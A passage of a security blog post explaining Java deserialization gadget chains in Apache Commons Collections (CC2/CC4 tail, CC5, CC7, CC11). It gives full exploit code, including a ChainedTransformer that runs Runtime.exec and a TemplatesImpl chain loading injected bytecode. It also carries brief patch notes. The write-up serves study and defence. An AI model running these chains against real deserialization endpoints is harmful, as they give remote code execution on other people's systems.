<span class="variable">queue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>(<span class="number">2</span>);</span><br><span class="line">    queue.add(<span class="number">1</span>);</span><br><span class="line">    queue.add(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    field = queue.getClass().getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    field.set(queue, comparator);</span><br><span class="line"></span><br><span class="line">    field = queue.getClass().getDeclaredField(<span class="string">&quot;queue&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    Object[] tmp = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;TrAXFilter.class, TrAXFilter.class&#125;;</span><br><span class="line">    field.set(queue, tmp);</span><br><span class="line"></span><br><span class="line">    serialize(queue);</span><br><span class="line">    unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">    oos.writeObject(obj);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">    <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">    <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="PATCH-2"><a href="#PATCH-2" class="headerlink" title="PATCH"></a>PATCH</h3><p>In 4.1 and 3.2.2, commons collections add a new method <code>FunctorUtils#checkUnsafeSerialization</code> to check whether the Deserialization is safe. If we unserialize some dangerous class(like Transformer), it will throw an exception.</p>
<p>Besides, in 4.1, the dangerous Transformer class will not implement Serializable any more.</p>
<h2 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h2><h3 id="ENV-4"><a href="#ENV-4" class="headerlink" title="ENV"></a>ENV</h3><ul>
<li>JDK8</li>
<li>commons-collections-3.2.1</li>
</ul>
<h3 id="Gadget-Chain-5"><a href="#Gadget-Chain-5" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><h4 id="TiedMapEntry-1"><a href="#TiedMapEntry-1" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>Same as CC6, we will use this class to trigger <code>LazyMap#get</code>, but this time, will use <code>TiedMapEntry#toString</code></p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712145309352.png" class title="image-20230712145309352">

<h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>In <code>BadAttributeValueExpException#readObject</code>, there exists a call to <code>toString</code></p>
<img src="/2023/07/11/Commons-Collections-Exploit/image-20230712145422130.png" class title="image-20230712145422130">

<p>So a new chain has been constructed.</p>
<h3 id="EXP-4"><a href="#EXP-4" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String argc[])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;open -a calculator&quot;</span>&#125;)</span><br><span class="line">                &#125;</span><br><span class="line">        );</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(map, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> BadAttributeValueExpException.class.getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(badAttributeValueExpException, tiedMapEntry);</span><br><span class="line"></span><br><span class="line">        serialize(badAttributeValueExpException);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(Filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><h3 id="ENV-5"><a href="#ENV-5" class="headerlink" title="ENV"></a>ENV</h3><ul>
<li>JDK8</li>
<li>commons-collections-3.2.1</li>
</ul>
<h3 id="Gadget-Chain-6"><a href="#Gadget-Chain-6" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><h4 id="Hashtable-amp-amp-AbstractMapDecorator"><a href="#Hashtable-amp-amp-AbstractMapDecorator" class="headerlink" title="Hashtable &amp;&amp; AbstractMapDecorator"></a>Hashtable &amp;&amp; AbstractMapDecorator</h4><p>It’s also a easy chain. I will just give the method name this time.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HashTable.readObject()</span><br><span class="line">-&gt;HashTable.reconstitutionPut()</span><br><span class="line">-&gt;AbstractMapDecorator.equals()</span><br><span class="line">-&gt;LazyMap.get()</span><br></pre></td></tr></table></figure>

<h3 id="EXP-5"><a href="#EXP-5" class="headerlink" title="EXP"></a>EXP</h3><p>In fact, it has a lot of details to weave the EXP…</p>
<p>But I don’t think they are important…</p>
<h2 id="CC11"><a href="#CC11" class="headerlink" title="CC11"></a>CC11</h2><h3 id="ENV-6"><a href="#ENV-6" class="headerlink" title="ENV"></a>ENV</h3><ul>
<li>JDK8</li>
<li>commons-collections-3.2.1</li>
</ul>
<h3 id="Gadget-Chain-7"><a href="#Gadget-Chain-7" class="headerlink" title="Gadget Chain"></a>Gadget Chain</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap.readobject()</span><br><span class="line">-&gt;TiedMapEntry.hashcode()</span><br><span class="line">-&gt;LazyMap.get()</span><br><span class="line">-&gt;InvokerTransformer.transform()</span><br><span class="line">-&gt;TemplatesImpl.newTransformer()</span><br></pre></td></tr></table></figure>

<h3 id="EXP-6"><a href="#EXP-6" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] argc)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Field field;</span><br><span class="line"></span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="string">&quot;calc.class&quot;</span>));</span><br><span class="line"></span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="string">&quot;P3ngu1nW&quot;</span>);</span><br><span class="line"></span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;evil&#125;);</span><br><span class="line"></span><br><span class="line">        field = TemplatesImpl.class.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(templates, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;(), transformer);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(tmp, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt;hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        field = TiedMapEntry.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(tiedMapEntry, lazyMap);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(filename));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Commons-Collections-Exploit"><span class="toc-number">1.</span> <span class="toc-text">Commons-Collections-Exploit</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Introduction"><span class="toc-number">1.1.</span> <span class="toc-text">Introduction</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1-Lazy-Map"><span class="toc-number">1.2.</span> <span class="toc-text">CC1(Lazy Map)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV"><span class="toc-number">1.2.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain"><span class="toc-number">1.2.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#InvokerTransformer"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">InvokerTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ChainedTransformer"><span class="toc-number">1.2.2.2.</span> <span class="toc-text">ChainedTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ConstantTransformer"><span class="toc-number">1.2.2.3.</span> <span class="toc-text">ConstantTransformer</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LazyMap"><span class="toc-number">1.2.2.4.</span> <span class="toc-text">LazyMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler"><span class="toc-number">1.2.2.5.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP"><span class="toc-number">1.2.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATCH"><span class="toc-number">1.2.4.</span> <span class="toc-text">PATCH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC1-Transformed-Map"><span class="toc-number">1.3.</span> <span class="toc-text">CC1(Transformed Map)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Env"><span class="toc-number">1.3.1.</span> <span class="toc-text">Env</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-1"><span class="toc-number">1.3.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformedMap"><span class="toc-number">1.3.2.1.</span> <span class="toc-text">TransformedMap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AbstractInputCheckedMapDecorator"><span class="toc-number">1.3.2.2.</span> <span class="toc-text">AbstractInputCheckedMapDecorator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#AnnotationInvocationHandler-1"><span class="toc-number">1.3.2.3.</span> <span class="toc-text">AnnotationInvocationHandler</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-1"><span class="toc-number">1.3.3.</span> <span class="toc-text">EXP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATCH-1"><span class="toc-number">1.3.4.</span> <span class="toc-text">PATCH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">1.4.</span> <span class="toc-text">CC6</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry"><span class="toc-number">1.4.2.1.</span> <span class="toc-text">TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#HashMap"><span class="toc-number">1.4.2.2.</span> <span class="toc-text">HashMap</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-2"><span class="toc-number">1.4.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC3"><span class="toc-number">1.5.</span> <span class="toc-text">CC3</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-2"><span class="toc-number">1.5.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-3"><span class="toc-number">1.5.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">1.5.2.1.</span> <span class="toc-text">TemplatesImpl</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#TrAXFilter"><span class="toc-number">1.5.2.2.</span> <span class="toc-text">TrAXFilter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#InstantiateTransformer"><span class="toc-number">1.5.2.3.</span> <span class="toc-text">InstantiateTransformer</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-3"><span class="toc-number">1.5.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC2-amp-amp-CC4"><span class="toc-number">1.6.</span> <span class="toc-text">CC2&amp;&amp;CC4</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-3"><span class="toc-number">1.6.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-4"><span class="toc-number">1.6.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TransformingComparator"><span class="toc-number">1.6.2.1.</span> <span class="toc-text">TransformingComparator</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PriorityQueue"><span class="toc-number">1.6.2.2.</span> <span class="toc-text">PriorityQueue</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-CC2"><span class="toc-number">1.6.3.</span> <span class="toc-text">EXP(CC2)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PATCH-2"><span class="toc-number">1.6.4.</span> <span class="toc-text">PATCH</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5"><span class="toc-number">1.7.</span> <span class="toc-text">CC5</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-4"><span class="toc-number">1.7.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-5"><span class="toc-number">1.7.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#TiedMapEntry-1"><span class="toc-number">1.7.2.1.</span> <span class="toc-text">TiedMapEntry</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#BadAttributeValueExpException"><span class="toc-number">1.7.2.2.</span> <span class="toc-text">BadAttributeValueExpException</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-4"><span class="toc-number">1.7.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7"><span class="toc-number">1.8.</span> <span class="toc-text">CC7</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-5"><span class="toc-number">1.8.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-6"><span class="toc-number">1.8.2.</span> <span class="toc-text">Gadget Chain</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Hashtable-amp-amp-AbstractMapDecorator"><span class="toc-number">1.8.2.1.</span> <span class="toc-text">Hashtable &amp;&amp; AbstractMapDecorator</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-5"><span class="toc-number">1.8.3.</span> <span class="toc-text">EXP</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC11"><span class="toc-number">1.9.</span> <span class="toc-text">CC11</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ENV-6"><span class="toc-number">1.9.1.</span> <span class="toc-text">ENV</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadget-Chain-7"><span class="toc-number">1.9.2.</span> <span class="toc-text">Gadget Chain</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP-6"><span class="toc-number">1.9.3.</span> <span class="toc-text">EXP</span></a></li></ol></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/11/Commons-Collections-Exploit/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&text=Commons Collections Exploit"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&is_video=false&description=Commons Collections Exploit"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Commons Collections Exploit&body=Check out this article: http://example.com/2023/07/11/Commons-Collections-Exploit/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&title=Commons Collections Exploit"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/11/Commons-Collections-Exploit/&name=Commons Collections Exploit&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/11/Commons-Collections-Exploit/&t=Commons Collections Exploit"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2023
    P3ngu1nW
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/p3ngu1nw">Projects</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
